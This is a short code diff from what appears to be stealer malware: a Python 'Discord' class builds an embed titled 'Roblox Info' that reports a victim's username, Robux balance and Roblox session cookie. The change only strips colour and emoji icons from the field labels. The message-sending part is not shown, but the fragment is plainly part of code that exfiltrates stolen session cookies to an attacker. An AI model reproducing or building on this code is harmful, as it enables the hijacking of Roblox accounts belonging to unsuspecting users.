@@ -430,20 +430,19 @@ class Discord:
                             "embeds": [
                                 {
                                     "title": "Roblox Info",
-                                    "color": 5639644,
                                     "fields": [
                                         {
-                                            "name": "<:roblox_icon:1041819334969937931> Name:",
+                                            "name": "Name:",
                                             "value": f"`{info['UserName']}`",
                                             "inline": True
                                         },
                                         {
-                                            "name": "<:robux_coin:1041813572407283842> Robux:",
+                                            "name": "Robux:",
                                             "value": f"`{info['RobuxBalance']}`",
                                             "inline": True
                                         },
                                         {
-                                            "name": "🍪 Cookie:",
+                                            "name": "Cookie:",
                                             "value": f"`{robo_cookie}`"
                                         }
                                     ],
